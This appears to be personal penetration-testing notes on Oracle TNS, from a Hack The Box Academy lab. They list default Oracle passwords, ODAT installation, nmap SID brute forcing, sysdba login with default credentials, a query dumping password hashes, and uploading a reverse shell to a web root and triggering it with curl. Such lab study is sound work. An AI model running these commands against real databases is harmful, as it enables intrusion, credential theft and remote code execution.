Oracle TNS
###########

Date: 2024-11-11 12:10

Status:

 `Oracle Transparent Network Substrate (TNS)`

Ports
*******

`1521/tcp` is the listener by default

Configuration
**************

-  Files are stored in the $ORACLE_HOME/network/admin directory
-  Client side configuration file is called ``tnsnames.ora``
-  Server side config file is called ``listener.ora``
-  Oracle 9’s default password is CHANGE_ON_INSTALL
-  Oracle 10 has no default password set
-  Oracle DBSNMP users a default password of dbsnmp
-  Each database has a unique entry in ``tnsnames.ora``

Installing tools
*****************

.. code-block:: console

   #!/bin/bash

   sudo apt-get install libaio1 python3-dev alien -y
   git clone https://github.com/quentinhardy/odat.git
   cd odat/
   git submodule init
   git submodule update
   wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
   unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
   wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
   unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
   export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
   export PATH=$LD_LIBRARY_PATH:$PATH
   pip3 install cx_Oracle
   sudo apt-get install python3-scapy -y
   sudo pip3 install colorlog termcolor passlib python-libnmap
   sudo apt-get install build-essential libgmp-dev -y
   pip3 install python-libnmap
   pip3 install pycryptodome

Test your tool by running:

.. code-block:: console

   ./odat.py -h

**note** This did not fucking work in Ubuntu 24 - failed modules galore

Footprinting
*************

Example 1: Using nmap to get service information

.. code-block:: console

   sudo nmap -p1521 -sV 10.129.204.235 --open

Example 2: Nmap SID Brute forcing

.. code-block:: console

    sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

Example 3: Using ODAT and all the attacks

.. code-block:: console

   ./odat.py all -s 10.129.204.235

Using the client
*****************

Example 1: SQLplus and getting table information

.. code-block:: console


   sqlplus scott/tiger@10.129.204.235/XE

   SQL> select table_name from all_tables;

Example 2: Connecting as a sysdba and getting user privileges and then
password hashes

.. code-block:: console


   sqlplus scott/tiger@10.129.204.235/XE as sysdba

   select * from user_role_privs;

   SQL> select name, password from sys.user$;

Example attack
*****************

-  The web root path is known
-  You create a reverse shell
-  Upload the shell with odat.py
-  create a listener
-  visit the shell on the web

.. code-block:: console


   ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot shell.exe ./shell.exe

.. code-block:: console

   curl -X GET http://10.129.204.235/shell.exe

References
************
https://academy.hackthebox.com/module/112/section/2117
